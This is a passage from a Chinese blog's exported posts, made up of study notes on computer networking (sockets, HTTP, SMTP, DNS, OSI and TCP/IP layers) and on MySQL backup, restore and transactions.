</ol>
<h3 id="套接字（Socket）"><a href="#套接字（Socket）" class="headerlink" title="套接字（Socket）"></a>套接字（Socket）</h3><p>套接字是一种应用编程接口（API），不同主机的应用进程间通信的抽象机制。应用进程通过套接字将数据控制权转移给操作系统，以实现信息从应用层到传输层的转换。</p>
<h3 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h3><p>每个应用进程都可能对应一个或多个套接字。为了区分不同套接字，操作系统给每个套接字绑定一个 16 位整数（0——65535），称之为<strong>端口号（port）</strong>。</p>
<p>对外标识通信端点：IP Address + port。</p>
<h3 id="进程寻址"><a href="#进程寻址" class="headerlink" title="进程寻址"></a>进程寻址</h3><p>为了与另一个端系统通信，必须知道：</p>
<ol>
<li>另一端系统的地址</li>
<li>定义在目的端系统中的接收进程的标志符</li>
</ol>
<p>端系统地址由<code>IP地址</code>确定，而接收进程标志符由<code>端口</code>确定。</p>
<p>操作系统对内标识套接字：<strong>套接字描述符（socket descriptor）</strong>，非常类似于文件的抽象机制。每个进程有一个套接字描述符表，进程每创建一个套接字都会在表里增加一个条目，每个条目对应一个套接字数据结构指针。</p>
<p><img src="https://i.loli.net/2019/12/21/LEHvFzdNowkq6Bc.png" alt="套接字描述符表"></p>
<p>地址族（family）：不同传输协议下主机的端点形式不同，用地址族区分不同的传输协议。</p>
<p>类型（service）：区分某一传输协议下的不同协议。</p>
<p><img src="https://i.loli.net/2019/12/21/4vTABxRFnmIgh9Q.png" alt="协议类型"></p>
<h2 id="几种常见的应用层协议"><a href="#几种常见的应用层协议" class="headerlink" title="几种常见的应用层协议"></a>几种常见的应用层协议</h2><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>HTTP（超文本传输协议）是 Web 的核心。在 Web 应用中，客户与服务器之间是通过 HTTP 报文进行会话的。而HTTP协议定义了报文格式与交换方式。Web 服务器实现了 HTTP 的服务器端，用于存储 Web 对象，每个对象由 url 寻址。</p>
<p><img src="https://i.loli.net/2020/01/20/9MTnkYv5yfxOL1u.png" alt="HTTP请求格式"></p>
<p><img src="https://i.loli.net/2020/01/20/StgFZXMs5GIbwYc.png" alt="HTTP响应格式"></p>
<p>HTTP 使用<code>TCP</code>作为它的支撑运输协议，默认采用<code>带流水机制的持久性连接</code>。 一次完整的<code>请求——响应</code>流程是这样的：</p>
<ol>
<li>HTTP客户端首先发起一个与服务器的 TCP 连接，一旦连接建立，该客户端进程与服务器进程就可以通过套接字接口通信。</li>
<li>客户端向它的<code>套接字</code>接口发送 HTTP 请求报文。</li>
<li>服务器收到 HTTP 请求报文并生成相应的响应报文，通过服务器的<code>套接字</code>发送响应报文。</li>
<li>客户端从<code>套接字</code>接受响应报文。</li>
<li>所有报文传输结束，关闭 TCP 连接。</li>
</ol>
<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>HTTP 是无状态协议，不记录客户端的历史行为，换言之对服务器而言每个 HTTP 请求都是独立的，不和历史请求有任何关系。为了辨别用户身份，维持 session，cookie 应运而生，它是一小段储存在客户端且通常经过加密的数据。</p>
<p>Cookie 在 HTTP 协议中以头部行的形式传输，由服务器设置，被客户端（通常是浏览器）保存在本地。</p>
<p><img src="https://i.loli.net/2020/01/20/wvu6zqyA9rKFDib.png" alt="Cookie原理"></p>
<h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><p>通过 SMTP（简单邮件传输协议）实现发送邮件。因特网电子邮件系统由 3 部分组成：</p>
<ul>
<li>用户代理。常见的邮件客户端如 Outlook 等都是用户代理，如果是通过 Web 端发送邮件，那么浏览器是用户代理。用户代理负责读写邮件、与邮件服务器交互</li>
<li>邮件服务器。通常由企业提供，如 QQ 邮箱的服务器<code>smtp.qq.com</code>，126 邮箱服务器<code>smtp.126.com</code></li>
<li>SMTP。负责在邮件服务器之间发送邮件</li>
</ul>
<p>一个典型的发送邮件的过程是：</p>
<ol>
<li>从发送方的用户代理开始，传输到发送方的邮件服务器</li>
<li>从发送方的邮件服务器发到接收方的邮件服务器，然后被分发到接收方的邮箱中</li>
<li>接收方通过用户代理从邮箱获取邮件</li>
</ol>
<p>SMTP 是因特网电子协议中的主要应用层协议，它用 TCP 提供可靠数据传输服务。</p>
<p>SMTP 规定邮件报文首部必须包含关键字<code>From:</code>与<code>To:</code>，可以包含关键字<code>Subject:</code>。</p>
<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>如果把客户向服务器发送报文比作打电话，那么服务器的IP地址是电话号码，域名是号码主人的姓名，而 DNS（Domain Name System 域名系统）就是电话簿，把姓名和电话号码联系起来。</p>
<p>DNS是：</p>
<ol>
<li>一个由分层的DNS服务器实现的分布式数据库</li>
<li>一个使主机能够查询分布式数据库的应用层协议</li>
</ol>
<p>DNS提供的服务有：</p>
<ul>
<li>域名解析服务</li>
<li>主机别名服务</li>
<li>邮件服务器别名服务</li>
<li>负载均衡。将一个域名与多个IP地址对应起来，当客户对域名发出一个DNS请求时，每次响应都循环<br>这些IP地址的次序。由于客户总是向排在最前面的IP地址发送HTTP请求，由此实现了负载均衡。</li>
</ul>
<p>获得一个域名的 IP 地址的过程如下：</p>
<ol>
<li>浏览器把域名发送到用户主机上的DNS客户端 </li>
<li>DNS 客户端向 DNS 服务器发送一个包含主机名的请求</li>
<li>DNS 服务器通过查询相应的域名——&gt; I 地址间的映射关系，生成一个响应报文并返回</li>
<li>DNS 客户端收到响应报文，把报文中的IP地址传给浏览器</li>
</ol>
<h4 id="实质"><a href="#实质" class="headerlink" title="实质"></a>实质</h4><p>多层命名服务器构成的<strong>分布式</strong>数据库。属于应用层协议，负责域名解析功能。  </p>
<h4 id="分层式层次式数据库"><a href="#分层式层次式数据库" class="headerlink" title="分层式层次式数据库"></a>分层式层次式数据库</h4><p>第一层：根域名服务器（root）</p>
<p>第二层：顶级域名服务器（top-level domain，TLD），负责 com，org，cn，jp 等</p>
<p>第三层：权威域名服务器（authoritative），负责组织域名解析，如 alibaba，baidu 等</p>
<p><img src="https://i.loli.net/2019/12/21/gXAveHhuimtyWl5.png" alt="分层结构"></p>
<p>举个例子：客户端访问 <a href="www.baidu.com">www.baidu.com</a>。</p>
<ol>
<li>向根域名服务器发送查询请求。根域名服务器返回 com 域名服务器地址。</li>
<li>向 com 域名服务器发送查询请求。com 域名服务器返回 baidu.com 域名服务器地址。</li>
<li>向 baidu.com 域名服务器发送查询请求。baidu.com 域名服务器返回 w<a href="http://www.baidu.com/">www.baidu.com</a> 地址。</li>
</ol>
<p><strong>本地域名服务器：</strong> 不严格属于层级体系，每个 ISP 有一个本地域名服务器，是该 ISP 用户的默认域名解析服务器。作为代理将该 ISP 用户的查询转发给域名解析服务器系统。</p>
<h4 id="为什么不用采用集中式架构"><a href="#为什么不用采用集中式架构" class="headerlink" title="为什么不用采用集中式架构"></a>为什么不用采用集中式架构</h4><ul>
<li>单点失败问题</li>
<li>流量问题</li>
<li>距离问题</li>
<li>维护性问题</li>
</ul>
<p>不可伸缩！</p>
<h4 id="DNS-查询方式"><a href="#DNS-查询方式" class="headerlink" title="DNS 查询方式"></a>DNS 查询方式</h4><ul>
<li><p>迭代查询。用户的查询被转发到本地域名服务器上，本地域名服务器依次访问 3 层域名解析服务器系统。</p>
</li>
<li><p>递归查询。用户的查询被转发到本地域名服务器上，本地域名服务器访问根域名服务器，根域名服务器访问顶级域名服务器，顶级域名服务器访问权威域名服务器。最后的查询结果依次返回给上一层。</p>
</li>
</ul>
<h4 id="DNS-缓存与更新"><a href="#DNS-缓存与更新" class="headerlink" title="DNS 缓存与更新"></a>DNS 缓存与更新</h4><p>一段时间后，缓存条目会失效。本地域名服务器一般会缓存顶级域名服务器地址，所以根域名服务器较少被访问。</p>
<h4 id="DNS-记录与格式"><a href="#DNS-记录与格式" class="headerlink" title="DNS 记录与格式"></a>DNS 记录与格式</h4><p>DNS 记录又称资源记录（RR，Resource Record）。是一个四元组：<strong>（name，value，type，ttl）</strong>。</p>
<ul>
<li>type=A：name=主机域名，value=IP 地址。</li>
<li>type=NS：name=域（edu.cn、qiuyueqy.com），value=该域的权威域名解析服务器的主机域名。</li>
<li>type=CNAME：name=某真实域名的别名，value=真实域名。</li>
<li>type=MX：name=域（126.com，163.com）,value=与name对应的邮件服务器.</li>
</ul>
<h4 id="为什么在应用层实现"><a href="#为什么在应用层实现" class="headerlink" title="为什么在应用层实现"></a>为什么在应用层实现</h4><p>我们希望把复杂的东西尽量放在端系统实现。在应用层实现 DNS 协议有利于降低网络核心的复杂度。</p>
<h4 id="DNS缓存"><a href="#DNS缓存" class="headerlink" title="DNS缓存"></a>DNS缓存</h4><p>由上可知，为了获取一个DNS地址进行了很多次请求，这就影响了速度。为了加快响应速度，DNS服务器有缓存机制：在一个请求链中，当某DNS服务器接收到一个DNS回答，它能将该回答中的信息缓存到本地存储器中，类似于Web缓存器。在一段时间（默认为两天）后将缓存信息丢弃。</p>
<h4 id="DNS劫持与污染"><a href="#DNS劫持与污染" class="headerlink" title="DNS劫持与污染"></a>DNS劫持与污染</h4><p>DNS 污染是指服务器检测到用户访问特定的主机时，伪装成 DNS 服务器向用户返回错误IP地址。国内用户访问 youtube 等网站时就会遇到这种情况</p>
<p>DNS 劫持是通过劫持特定的DNS服务器，在 DNS 服务器里存放错误的缓存信息，这样 DNS 服务器就会向用户返回错误的 IP 地址</p>
<p>对于 DNS 劫持，可用采用更换默认 DNS 服务器的方式解决。而 DNS 污染只能通过修改 hosts 文件、VPN 等方式绕过服务器</p>
<h3 id="P2P"><a href="#P2P" class="headerlink" title="P2P"></a>P2P</h3><p>P2P（Peer to Peer）应用的几个特点：</p>
<ul>
<li>没有服务器</li>
<li>任意端系统之间直接互联</li>
<li>节点阶段性接入Intent</li>
<li>节点可能更换IP地址</li>
</ul>
<h3 id="网关-gateway"><a href="#网关-gateway" class="headerlink" title="网关(gateway)"></a>网关(gateway)</h3><p>在一个局域网内互相通信是不需要用到网关的，而局域网内的接口要访问外网时，则需要把请求发送到网关上，由网关负责向外发送流量。同理，外网的信息也是通过网关再传达给内网接口</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>应用层</tag>
      </tags>
  </entry>
  <entry>
    <title>网络那些事之基本概念</title>
    <url>/2018/06/04/%E7%BD%91%E7%BB%9C%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
    <content><![CDATA[<p>计算机网络是一个自治的、互联的计算机集合。</p>
<span id="more"></span>

<h2 id="因特网"><a href="#因特网" class="headerlink" title="因特网"></a>因特网</h2><p>因特网是一个世界范围的计算机网络，是“网络的网络”。由十多个第一层<code>ISP(因特网服务提供商)</code>和数十万个底层 ISP 组成。ISP 覆盖区域有所不同，有些跨越多个大洲和大洋，有些限于很小的地理区域。低层 ISP 与高层 ISP 互联，高层ISP彼此互联。</p>
<h2 id="端系统"><a href="#端系统" class="headerlink" title="端系统"></a>端系统</h2><p>所有连接到因特网的设备都称为<code>主机</code>或<code>端系统</code>。</p>
<p>端系统通过<code>通信链路</code>和<code>分组交换机</code>连接到一起。通俗的讲通信链路就是一条条光缆、网线等物理线路，不同的链路能以不同的速率传输数据，链路的传输速率单位为<code>bit/s或bps</code>，即<code>比特/秒</code>。端系统通过 ISP 接入因特网。</p>
<p>当一台端系统向另一台端系统发送数据时，发送端系统将数据将数据分段，并为每段加上首部字节。由此形成的信息包称为<code>分组</code>。这些分组通过网络发送到目的端系统，在那里被装配成初始数据。分组交换机从它的一条入通信链路接收到达的分组，并从它的一条出通信链路转发该分组。目前最出名的两种分组交换机类型是<code>路由器</code>和<code>链路层交换机</code>。这两种类型的交换机朝着最终的目的地转发分组。链路层交换机常用于接入网中，而路由器常用于网络核心中。从发送端到接收端，一个分组所经历的一系列通信链路和分组交换机称为通过该网络的<code>路径</code>。</p>
<p>与因特网相连的端系统提供了<code>应用程序编程接口(API)</code>,该API规定了运行在一个端系统上的软件请求因特网基础设施向运行在另一个端系统上的特定目的地软件交付数据的方式。因特网API是一套发送软件必须遵循的规则集合。类似于我们在寄信的时候需要遵邮局的规定贴上邮票、写上邮政编码等，这些规定就是 API。</p>
<h2 id="网络边缘"><a href="#网络边缘" class="headerlink" title="网络边缘"></a>网络边缘</h2><p>常把与因特网相连的设备称为端系统，因为它们位于网络的边缘。将端系统连接到其<code>边缘路由器</code>的物理链路称为<code>接入网</code>。<code>边缘路由器</code>是端系统到任何其他远程系统的路径上的第一台路由器。<br>除了端系统外，<code>网络应用</code>也处于网络边缘。网络应用通常有两种结构：</p>
<ul>
<li>客户——服务器结构（Client-Server）。常见的 Web 应用都是这种结构。这种应用的特点是客户只与服务器进行交互，只有客户可以主动发起连接。<strong>客户与客户之间是互不可见的</strong></li>
<li>P2P 结构（点对点结构）。这种结构是对等的，不存在客户和服务器的概念。各个端点之间可以直接互相访问。例子有文件共享服务如bt下载，所以才会有<strong>越多人下载速度越快</strong>的说法</li>
</ul>
<h3 id="家庭接入"><a href="#家庭接入" class="headerlink" title="家庭接入"></a>家庭接入</h3><p>当前宽带住宅接入有两种流行类型：</p>
<ul>
<li>数字用户线(Digital Subscriber Line，DSL)。即常说的拨号上网。利用DSL调制解调器将到达家庭的数据信号和电话信号分隔开（ADSL是非对称接入，即上行与下行速率是不同的，通常下行更快）</li>
<li>电缆（HFC,混合光纤同轴电缆网）。通过有线电视网络进行传输，用cable modem（即“猫”）将电视信号与网络信号分开。这也是非对称的，下行通常到30Mbts，上行为2Mbps</li>
<li>光纤到户。本地中心局直接提供了一条光纤线路到家庭。</li>
<li>LAN 无限局域网。在公司、大学和越来越多的家庭环境中，通常是用局域网(LAN)将端系统连接到边缘路由器。尽管有多种不同的局域网技术，但<code>以太网</code>是目前最流行的接入技术。在无线LAN环境中，无线用户从一个接入点发送/接受分租，接入点与企业网连接，该企业网再与有线因特网相连，这就是 wifi。可达 54Mbps</li>
<li>蜂窝网。蜂窝网也属于无线接入。所谓3G网4G网都属于蜂窝网。</li>
</ul>
<h2 id="网络核心"><a href="#网络核心" class="headerlink" title="网络核心"></a>网络核心</h2><p><code>网络核心</code>即互联因特网端系统的分组交换机和链路构成的网状网络。</p>
<p>网络核心的关键功能是<code>路由</code>+<code>转发</code>。<code>路由</code>即确定分组从源到目的地的路径。</p>
<h3 id="存储转发传输"><a href="#存储转发传输" class="headerlink" title="存储转发传输"></a>存储转发传输</h3><p>多数分组交换机在链路的输入端用<code>存储转发传输机制</code>：交换机能够在开始向输出链路传输该分组的第一个比特之前，必须接收到整个分组。由此存在<code>存储转发延时</code>：如果某源端系统或分组交换机经过一条链路发送一个L比特的分组，链路的传输速率为R bit/s，则分组在这条链路上的传输时间为 L/R 秒。</p>
<h3 id="排队延时和丢包"><a href="#排队延时和丢包" class="headerlink" title="排队延时和丢包"></a>排队延时和丢包</h3><p>每个分组交换机有多条链路与之相连。对于每条相连的链路，该分组交换机有一个<code>输出缓存</code>用于存储路由器准备发往那条链路的分组。如果到达的分组需要传输到某天链路但发现该链路正忙于传输其他分组，该到达分组必须在输出缓存中等待，由此分组又存在<code>排队延时</code>。缓存空间是有限的，一个到达的分组可能发现该缓存已满，此时会发生<code>丢包(分组丢失)</code>：到达的分组或正排队的分组之一会被丢弃。</p>
<h3 id="转发表和路由选择协议"><a href="#转发表和路由选择协议" class="headerlink" title="转发表和路由选择协议"></a>转发表和路由选择协议</h3><p>在因特网中，每个端系统具有一个被称为<code>IP地址</code>的地址。当源主机要向目的地端系统发送一个分组时，源在该分组的首部包含了目的地的 IP 地址。如同邮政地址那样，该地址具有一种等级结构。当一个分组到达网络中的路由器时，路由器检查该分组的目的地地址的一部分，并向一台相邻路由器转发该分组。更特别的是，每台路由器具有一个<code>转发表</code>，用于将目的地址映射为输出链路。当某分组到达一台路由器时，路由器检查该地址，并用这个目的地址搜索其转发表，以发行适当的出链路。路由器则将分组导向该出链路。</p>
<h2 id="分组交换时延"><a href="#分组交换时延" class="headerlink" title="分组交换时延"></a>分组交换时延</h2><p>分组从一个主机出发通过一系列路由器传输，在另一台主机中结束它的历程。这个过程是存在时延的。其中最为重要的几种时延是<code>节点处理时延</code>、<code>排队时延</code>、<code>传输时延</code>、<code>传播时延</code>。这些延时加起来称为<code>节点总时延</code></p>
<ul>
<li>节点处理时延（nodal processing delay）。造成这部分时延的原因主要是检查分组首部（差错检测）和决定将该分组导向何处（确定输出链路）</li>
<li>排队时延（queueing delay）。链路繁忙时新到达交换机的分组会进入排队状态。</li>
<li>传输时延（transmission delay）。仅当所有先到达的分组传输完毕后才能传输刚到达的分组。传输时延是将该分组的所有比特推向链路所需要的时间。L 为分组长度，R 为链路带宽，则传输时延为 L/R</li>
<li>传播时延（propagation delay）。分组在链路上传播的时间称为传播时延。d 为链路长度，v 为传播速率，则传播时延为 d/v</li>
</ul>
<p>传输时延与传播时延不同之处在于传输时延是分组从交换机到链路的时间，与分组的大小有关，与两台路由器之间的距离无关。而传播时延是分组在链接上传播消耗的时间，与分组大小无关，与距离有关。</p>
<h2 id="OSI七层协议"><a href="#OSI七层协议" class="headerlink" title="OSI七层协议"></a>OSI七层协议</h2><p>每层完成一类特定功能，底层为上层提供服务，相邻的两层通过<code>接口</code>进行交互，任一层实体提供的服务是<code>垂直的</code>。</p>
<p>计算机网络体系结构是计算机网络各层及其协议的集合。<strong>协议是控制两个对等实体进行通信的规则</strong>的集合，协议是<code>水平的</code>。</p>
<p><img src="https://i.loli.net/2020/01/19/JHuDU5ys3oX84IC.png" alt="OSI模型通信过程"></p>
<p>中间系统只实现网络层、链路层和物理层，这三层合称“非端到端层(non-end-end)”。</p>
<h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>数据在每一层都会被打上一个该层的附加信息（所谓运输首部信息），称为 PDU(Protocol Data Unit)。而这些信息会在下一层被使用。</p>
<p><img src="https://i.loli.net/2020/01/19/zK7oIaJw41ncGgY.png" alt="OSI模型封装过程"></p>
<h3 id="为什么要封装"><a href="#为什么要封装" class="headerlink" title="为什么要封装"></a>为什么要封装</h3><ul>
<li>增加控制信息：地址信息（表示发送、接受端），差错检测编码，优先级设置等</li>
</ul>
<h3 id="非端到端层"><a href="#非端到端层" class="headerlink" title="非端到端层"></a>非端到端层</h3><h4 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h4><ul>
<li>规范接口特性：机械特性（形状，大小）、电气特性（电压、电频），功能特性（引脚）等</li>
<li>比特编码：如何表示 0 和 1</li>
<li>数据率：数据传输速率</li>
<li>传输模式：单工通信（单向），半双工通信（交替单向，发和收不同时），全双工通信（同时收发）</li>
</ul>
<h4 id="链路层"><a href="#链路层" class="headerlink" title="链路层"></a>链路层</h4><ul>
<li>两个直接相连的结点间的数据帧传输。</li>
<li>物理寻址。在帧头增加收发端物理地址标识信息（通常为 MAC 地址）。</li>
<li>流量控制。匹配发送和接收速度，避免淹没接收端。</li>
<li>差错控制。判断丢失帧与重复帧。</li>
<li>访问控制。决定哪个设备拥有物理链路使用权。</li>
</ul>
<h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><ul>
<li>跨越多个网络的数据分组传输</li>
<li>逻辑寻址，全局唯一（通常为 IP 地址）。</li>
<li>路由：路径选择及分组转发。</li>
</ul>
<p><img src="https://i.loli.net/2020/01/19/Xjb7cGfD285kEev.png" alt="分组转发"></p>
<p>网络层地址不变，链路层地址随传输过程不断更新。</p>
<h3 id="端到端层"><a href="#端到端层" class="headerlink" title="端到端层"></a>端到端层</h3><h4 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h4><p>源到目的端进程间报文传输。</p>
<ul>
<li>报文分段与重组</li>
<li>端口号寻址：确保将报文提交给正确进程。</li>
<li>连接控制：作为自下而上第一个端到端层次，建立或拆除端到端间的逻辑连接。</li>
<li>流量控制</li>
<li>差错控制（如 TCP）</li>
</ul>
<h4 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h4><p>不对数据进行分段，只插入一些信息。</p>
<ul>
<li>对话控制：建立、维护进程间对话</li>
<li>同步：在数据流中插入同步点，便于恢复对话</li>
</ul>
<h4 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h4><p>处理两个系统间交换信息的语法语义问题（如大小端机器对数据的表示方式不同）。</p>
<ul>
<li>数据表示转化：发送端把信息转化为主机独立的编码，接收端转化为主机相关编码</li>
<li>加密解密</li>
<li>压缩解压缩</li>
</ul>
<h4 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h4><p>向用户提供网络服务接口（如浏览器），根据不同应用场景处理用户数据。</p>
<h2 id="TCP-IP参考模型"><a href="#TCP-IP参考模型" class="headerlink" title="TCP/IP参考模型"></a>TCP/IP参考模型</h2><p><img src="https://i.loli.net/2020/01/19/OMNn6oqPg4f9G7d.png" alt="TCP/IP模型"></p>
<h2 id="Internet五层协议"><a href="#Internet五层协议" class="headerlink" title="Internet五层协议"></a>Internet五层协议</h2><p>综合 OSI 与 TCP/IP</p>
<ol>
<li>应用层。应用层是网络应用程序及他们的应用层协议存留的地方。HTTP、SMTP、FTP、DNS等都属于应用层协议。分组在应用层中称为<code>报文</code></li>
<li>运输层。<strong>进程之间</strong>传送报文。在因特网中有两个运输协议<code>TCP</code>和<code>UDP</code>。分组在运输层中称为<code>报文段</code></li>
<li>网络层。<strong>主机之间</strong>数据分组与转发。网络层接受运输层递交的报文段和目的地址，类似于寄信时要向邮局提供目标地址。著名的<code>IP协议</code>就在网络层。该协议定义了数据报中的各个字段及端系统和路由器如何作用于这些字段，以达到<code>逻辑寻址</code>的目的。分组在网络层称为<code>数据报</code></li>
<li>链路层。将网络层的IP数据包组装成帧（帧包含数据和必要的控制信息，例如信道编码，卷积码，turbo码），在<strong>相邻网络元素</strong>之间传输。</li>
<li>物理层。物理层负责将帧一个比特一个比特地从一个节点移动到下一个节点。进一步与链路实体（如双通铜线、单模光缆）相关。传输数据为比特流，物理层需要定义比特传输的电气特性（多少电压代表1多少代表0）、机械特性（接口形状尺寸等），如USB、Bluetooth等。而传输物理介质如光纤、双绞线等并不处于物理层的范畴</li>
</ol>
<p><img src="https://i.loli.net/2020/01/19/i1bsCztfQAxcIyK.png" alt="五层模型数据封装"></p>
<p>下面是知乎一个有趣的例子：</p>
<blockquote>
<p>为了实现跨越互联网的，主机 A 的进程 P1，和主机 B 的进程 P2 之间的通信，我们逐层把这个任务交给 TCP/IP 协议栈。<br>运输层：“如果有人能帮我把数据从某个网络中的机器 A 搬到另一个网络中的机器 B，我就可以搞定这个任务，因为我知道不同的数据应该交给机器上的哪个进程。”<br>网络层：“如果有人能帮我把数据从局域网中直接相连的一台机器搬到另一台机器，我就可以把数据从一个网络搬到另一个网络，因为我知道路线怎么走，要经过哪些节点。”<br>链路层：“我知道怎样在局域网中搬数据，还能用 CSMA/CD 协议协调工作，还能用 CRC32 校验发送的数据和接收的数据是一致的，blabla… But，我只是说说，我不干苦力活。”<br>物理层：“楼上的大爷们发话了，兄弟们上。”</p>
</blockquote>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL之备份与恢复</title>
    <url>/2018/06/03/%E3%80%8AMySQL%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E3%80%8B%E4%B9%8B%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/</url>
    <content><![CDATA[<h1 id="使用mysqldump命令备份"><a href="#使用mysqldump命令备份" class="headerlink" title="使用mysqldump命令备份"></a>使用mysqldump命令备份</h1><p><code>mysqldump</code> 命令可以将数据库中的数据备份成一个文本文件。表的结构和表中的数据将存储在生成的文本文件中。</p>
<p>mysqldump的工作原理就是查出需要备份的数据库和表的结构，然后在文本文件中生成相应的 <code>create</code> 和 <code>insert</code> 语句。需要导入数据库文件时 MySQL 通过使用文本文件中记录的语句生成相应的数据库和表就可以了。</p>
<p>使用 <code>mysqldump</code> 命令进行数据备份时，经常分为以下3种形式：</p>
<ol>
<li>备份一个数据库</li>
<li>备份多个数据库</li>
<li>备份所有数据库</li>
</ol>
<p>下面分别介绍：</p>
<h2 id="备份一个数据库"><a href="#备份一个数据库" class="headerlink" title="备份一个数据库"></a>备份一个数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqldump <span class="operator">-</span>u username <span class="operator">-</span>p dbname [table1 table2 ...] <span class="operator">&gt;</span> filename</span><br></pre></td></tr></table></figure>

<p>dbname 为数据库名。table1、table2 为表名，没有指定 table 时将备份整个数据库。filename为文本文件名称，通常使用<code>.sql</code>作为后缀。</p>
<p>例：备份数据库 users 中的 studnets 表到 D 盘的 sql 文件夹下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqldump <span class="operator">-</span>u root <span class="operator">-</span>p users  students <span class="operator">&gt;</span> D:\<span class="keyword">sql</span>\students.sql</span><br></pre></td></tr></table></figure>

<h2 id="备份多个数据库"><a href="#备份多个数据库" class="headerlink" title="备份多个数据库"></a>备份多个数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqldump <span class="operator">-</span>u username <span class="operator">-</span>p <span class="comment">--databeses dbname1 dbname2 &gt; filename</span></span><br></pre></td></tr></table></figure>

<p>加上 <code>databases</code> 选项，后面跟多个数据库名称</p>
<p>例：备份数据库 users、customers 到 D 盘：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqldump <span class="operator">-</span>u root <span class="operator">-</span>p <span class="comment">--databeses users customers &gt; data.sql</span></span><br></pre></td></tr></table></figure>

<h2 id="备份所有数据库"><a href="#备份所有数据库" class="headerlink" title="备份所有数据库"></a>备份所有数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqldump <span class="operator">-</span>u root <span class="operator">-</span>p <span class="comment">--all --databases &gt; filename</span></span><br></pre></td></tr></table></figure>

<h1 id="数据恢复"><a href="#数据恢复" class="headerlink" title="数据恢复"></a>数据恢复</h1><p>使用 <code>mysql</code> 命令进行还原：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>u root <span class="operator">-</span>p [dbname] <span class="operator">&lt;</span> filename</span><br></pre></td></tr></table></figure>

<p>dbname 表示数据库名称，该参数是可选的。指定数据库名称时，表示还原该数据库下的表，不指定时表示还原数据库。</p>
<p>也可以在进入相应数据库后用 <code>source</code> 命令恢复：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; use test;</span><br><span class="line">mysql&gt; source filename;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL之事务与优化</title>
    <url>/2018/06/03/%E3%80%8AMySQL%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E3%80%8B%E4%B9%8B%E4%BA%8B%E4%BB%B6%E4%B8%8E%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<p>在 MySQL 中，事务由一条或多条 SQL 语句组成，在这个事务中，每条 MySQL 语句是相互依赖的。而整个事务作为一个不可分割的整体，一旦某条 MySQL 语句执行失败或产生错误，整个事务将会回滚。</p>
<p>只有 <code>InnoDB</code> 类型的表支持事务。MySQL默认表类型为 <code>InnoDB</code>。</p>
<h2 id="事务的基本要素-ACID"><a href="#事务的基本要素-ACID" class="headerlink" title="事务的基本要素(ACID)"></a>事务的基本要素(ACID)</h2><ol>
<li>原子性（Atomicity）：事务开始后所有操作，要么全部做完，要么全部不做，不可能停滞在中间环节。事务执行过程中出错，会回滚到事务开始前的状态，所有的操作就像没有发生一样。也就是说事务是一个不可分割的整体，就像化学中学过的原子，是物质构成的基本单位。</li>
<li>一致性（Consistency）：事务开始前和结束后，数据库的完整性约束没有被破坏 。比如 A 向 B 转账，不可能 A 扣了钱，B 却没收到。</li>
<li>隔离性（Isolation）：每个事务在自己的空间内执行，与其他事务隔离，而且事务的结果只有在它被完全执行时才能看到。这样即使一个系统同时发生多个事物，孤立性也可以保证特定的事务在完成之前其结果不被公布。</li>
<li>持久性（Durability）：事务提交之后，就一定是在硬盘永久的存储，而不会丢失。</li>
</ol>
<h2 id="事务的创建与存在周期"><a href="#事务的创建与存在周期" class="headerlink" title="事务的创建与存在周期"></a>事务的创建与存在周期</h2><p>创建事务的一般过程是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">初始化事务 ————&gt; 创建事务 ————&gt; 提交或回滚</span><br></pre></td></tr></table></figure>

<p><strong>无论最后是提交还是回滚，都会关闭这个事务</strong>。  </p>
<ul>
<li>初始化事务：<code>start transaction;</code> 或 <code>begin;</code>，MySQL默认是<strong>自动提交</strong>的，所以需要用命令改为手动模式</li>
<li>创建事务：执行 SQ L语句</li>
<li>提交或回滚： 提交 <code>commit;</code>，回滚 <code>rollback;</code></li>
</ul>
<h2 id="事务的并发问题"><a href="#事务的并发问题" class="headerlink" title="事务的并发问题"></a>事务的并发问题</h2><ol>
<li>脏读：事务 A 读取了事务 B 更新的数据，然后 B 回滚操作，那么A读取到的数据是脏数据</li>
<li>不可重复读：事务 A 多次读取同一数据，事务 B 在事务 A 多次读取的过程中，对数据作了更新并提交，导致事务 A 多次读取同一数据时结果不一致。</li>
